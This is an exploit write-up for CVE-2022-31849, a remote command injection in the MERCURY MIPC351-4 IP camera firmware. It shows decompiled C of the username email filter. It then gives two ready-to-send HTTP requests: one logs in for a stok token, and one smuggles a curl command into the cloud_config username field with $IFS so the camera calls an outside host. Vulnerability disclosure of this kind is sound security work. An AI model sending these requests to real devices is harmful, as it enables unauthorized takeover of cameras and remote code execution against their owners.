# MERCURY MIPC351-4 command_execution

**CVE ID**: CVE-2022-31849

**Vender**: MERCURY

**Vendor Homepage**: https://www.mercurycom.com.cn/

**Affect products**: MIPC351-4

**Firmware version**: V5.x(20210728_1.0.8)

**Hardware Link**: https://service.mercurycom.com.cn/download/202111/MIPC351-4%20V5.X%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620210728_1.0.8.zip

**Exploit Author**: [SkYe231@Hillstone](mailto:ext-lhliang@Hillstonenet.com)

## describe

The Mercury MIPC351-4 has remote command execution, and remote attackers can bypass restrictions through carefully constructed packets to achieve remote command execution.

## detail

Taking the mailbox name as the core filtering rule of username, the rules only filter the mailbox format (see the code comments for details), and do not filter special symbols, so there is a chance of injection.

> file:/usr/bin/dsd

```c
/* expect return value 1 */

int FUN_00024aa4(byte *param_1)

{
  size_t sVar1;
  char *pcVar2;
  int iVar3;
  
                    /* username is empty */
  if (param_1 == (byte *)0x0) {
    return 0;
  }
                    /* length is 0 */
  sVar1 = strlen((char *)param_1);
  if (sVar1 == 0) {
    return 0;
  }
                    /* Limit length<129 */
  if ((int)sVar1 < 129) {
                    /* matches @ */
    pcVar2 = strchr((char *)param_1,L'@');
                    /* no matches */
    if (pcVar2 == (char *)0x0) {
      return 0;
    }
                    /* Does it end with @ */
    if (param_1[sVar1 - 1] != 0x40) {
                    /* Does it start with @ */
      iVar3 = *param_1 - 0x40;
      if (iVar3 != 0) {
        iVar3 = 1;
      }
      return iVar3;
    }
  }
  return 0;
}
```

## EXP

1. Log in to the background to get **stok** (cookie)

    ```
    POST / HTTP/1.1
    Host: 192.168.0.103
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 73
    Origin: http://192.168.0.103
    Connection: close
    Referer: http://192.168.0.103/
    
    {"method":"do","login":{"username":"{your_name}","password":"{your_password}"}}
    ```

2. Trigger remote command execution

    > Command:`curl$IFS-o-$IFS'http://192.168.0.101:9999/skye231'`

    ```
    POST /stok=05173d0162e8c77387fa1bbc12b2fa62/ds HTTP/1.1
    Host: 192.168.0.103
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 147
    Origin: http://192.168.0.103
    Connection: close
    Referer: http://192.168.0.103/
    
    {"cloud_config":{"bind":{"username":"\"}';curl$IFS-o-$IFS'http://192.168.0.101:9999/skye231';'{\"@mrskye.com","password":"admin123"}},"method":"do"}
    ```